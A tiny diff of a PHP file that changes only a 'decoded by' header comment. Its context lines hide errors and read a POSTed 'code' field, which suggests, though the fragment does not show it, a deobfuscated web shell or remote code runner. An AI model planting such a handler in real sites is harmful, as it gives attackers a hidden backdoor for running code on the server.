@@ -1,4 +1,4 @@
-<?php /* DECODED BY GANDARA FAJAR */
+<?php /* DECODED */
 @ini_set('output_buffering',0); 
 @ini_set('display_errors', 0);
 $text = $_POST['code'];
